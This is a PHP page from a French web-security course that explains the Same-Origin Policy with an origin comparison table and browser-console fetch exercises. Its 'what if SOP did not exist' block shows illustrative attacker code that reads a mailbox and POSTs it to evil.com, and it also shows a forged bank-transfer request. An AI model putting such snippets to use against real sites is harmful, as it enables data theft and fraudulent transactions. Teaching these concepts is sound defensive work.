<?php include __DIR__ . '/../../../includes/header.php'; ?>

<div class="page-header">
    <h2>Ch1 — Ex1 : Same-Origin Policy (SOP)</h2>
    <p>Comprendre la politique de même origine qui protège les utilisateurs dans le navigateur.</p>
    <span class="duration">20 min</span>
</div>

<div class="card">
    <h3>Qu'est-ce que la Same-Origin Policy ?</h3>
    <div class="explanation">
        <h4>Définition</h4>
        <p>La SOP est une règle de sécurité fondamentale du navigateur : un script chargé depuis une <strong>origine</strong> ne peut accéder qu'aux ressources de cette <strong>même origine</strong>.</p>
        <p style="margin-top:10px;">Une <strong>origine</strong> = <code>protocole</code> + <code>domaine</code> + <code>port</code></p>
    </div>

    <h4 style="margin-top:20px;">Test : Quelles origines sont identiques ?</h4>
    <table>
        <tr><th>URL A</th><th>URL B</th><th>Même origine ?</th><th>Raison</th></tr>
        <tr>
            <td><code>http://site.com/page1</code></td>
            <td><code>http://site.com/page2</code></td>
            <td><span class="badge badge-secure">OUI</span></td>
            <td>Même protocole, domaine, port</td>
        </tr>
        <tr>
            <td><code>http://site.com</code></td>
            <td><code>https://site.com</code></td>
            <td><span class="badge badge-vuln">NON</span></td>
            <td>Protocole différent (http vs https)</td>
        </tr>
        <tr>
            <td><code>http://site.com</code></td>
            <td><code>http://api.site.com</code></td>
            <td><span class="badge badge-vuln">NON</span></td>
            <td>Sous-domaine différent</td>
        </tr>
        <tr>
            <td><code>http://site.com</code></td>
            <td><code>http://site.com:8080</code></td>
            <td><span class="badge badge-vuln">NON</span></td>
            <td>Port différent (80 vs 8080)</td>
        </tr>
        <tr>
            <td><code>http://site.com</code></td>
            <td><code>http://evil.com</code></td>
            <td><span class="badge badge-vuln">NON</span></td>
            <td>Domaine différent</td>
        </tr>
    </table>
</div>

<div class="card">
    <div class="tabs">
        <button class="tab active" data-tab="demo">Démonstration</button>
        <button class="tab secure" data-tab="explication">Explication</button>
    </div>

    <div id="demo" class="tab-content active">
        <h3>Démonstration interactive</h3>
        <p>Ouvrez la <strong>console JavaScript</strong> de votre navigateur (F12 → Console) et testez :</p>

        <div class="code-block">
<span class="comment">// 1. Accéder à notre propre page (même origine) → AUTORISÉ</span>
<span class="secure">fetch('/tp/ch01-bases-securite/ex1-sop.php')
  .then(r => r.text())
  .then(t => console.log('Même origine OK :', t.substring(0, 100)));</span>

<span class="comment">// 2. Accéder à un site externe (origine différente) → BLOQUÉ par SOP</span>
<span class="vulnerable">fetch('https://www.google.com')
  .then(r => r.text())
  .then(t => console.log(t))
  .catch(e => console.error('BLOQUÉ par SOP :', e.message));</span>
        </div>

        <div class="alert alert-danger" style="margin-top:15px;">
            La requête vers google.com sera bloquée avec l'erreur :<br>
            <code>Access to fetch at 'https://www.google.com' from origin 'http://localhost:8080' has been blocked by CORS policy</code>
        </div>

        <hr style="margin:20px 0;">

        <h3>Que se passerait-il sans la SOP ?</h3>
        <div class="code-block">
<span class="comment">// Si la SOP n'existait pas, un site malveillant pourrait :</span>

<span class="vulnerable">// 1. Lire vos emails
fetch('https://mail.google.com/mail/inbox')
  .then(r => r.text())
  .then(html => {
    // Envoyer vos emails au pirate
    fetch('https://evil.com/steal', {
      method: 'POST', body: html
    });
  });</span>

<span class="vulnerable">// 2. Effectuer des virements bancaires
fetch('https://banque.com/api/transfer', {
  method: 'POST',
  body: JSON.stringify({to: 'pirate', amount: 10000})
});</span>

<span class="vulnerable">// 3. Lire vos messages privés
fetch('https://facebook.com/messages')
  .then(r => r.json())
  .then(messages => /* voler les messages */);</span>
        </div>
    </div>

    <div id="explication" class="tab-content">
        <h3>Ce que la SOP protège et ne protège pas</h3>

        <table>
            <tr><th>Action</th><th>Autorisé ?</th><th>Explication</th></tr>
            <tr>
                <td>Charger une image d'un autre site (<code>&lt;img&gt;</code>)</td>
                <td><span class="badge badge-secure">OUI</span></td>
                <td>Les balises HTML peuvent charger des ressources cross-origin</td>
            </tr>
            <tr>
                <td>Charger un script externe (<code>&lt;script src&gt;</code>)</td>
                <td><span class="badge badge-secure">OUI</span></td>
                <td>C'est comme ça que les CDN fonctionnent (jQuery, etc.)</td>
            </tr>
            <tr>
                <td>Soumettre un formulaire vers un autre site</td>
                <td><span class="badge badge-secure">OUI</span></td>
                <td>C'est pour ça que le CSRF existe !</td>
            </tr>
            <tr>
                <td><strong>Lire</strong> la réponse d'un fetch vers un autre site</td>
                <td><span class="badge badge-vuln">NON</span></td>
                <td>La SOP bloque la lecture de la réponse</td>
            </tr>
            <tr>
                <td>Accéder au DOM d'une iframe d'un autre site</td>
                <td><span class="badge badge-vuln">NON</span></td>
                <td>Chaque iframe a son propre contexte isolé</td>
            </tr>
        </table>

        <div class="explanation" style="margin-top:20px;">
            <h4>Retenez</h4>
            <p>La SOP empêche un site de <strong>lire</strong> les données d'un autre site. Mais elle n'empêche pas d'<strong>envoyer</strong> des requêtes (d'où les attaques CSRF). C'est CORS qui permet d'assouplir la SOP de manière contrôlée.</p>
        </div>
    </div>
</div>

<div class="two-cols">
    <div class="card">
        <h3>À retenir</h3>
        <ul style="margin:10px 0 0 20px;">
            <li>Origine = protocole + domaine + port</li>
            <li>La SOP isole les scripts par origine</li>
            <li>CORS permet d'assouplir la SOP (côté serveur)</li>
            <li>Les balises HTML (img, script, form) contournent la SOP</li>
        </ul>
    </div>
    <div class="card">
        <h3>Exercice</h3>
        <ol style="margin:10px 0 0 20px;">
            <li>Ouvrez la console F12</li>
            <li>Testez un <code>fetch</code> vers la même origine</li>
            <li>Testez un <code>fetch</code> vers google.com</li>
            <li>Observez le message d'erreur CORS</li>
        </ol>
    </div>
</div>

<a href="index.php" class="btn btn-primary">← Retour au chapitre 1</a>

<?php include __DIR__ . '/../../../includes/footer.php'; ?>
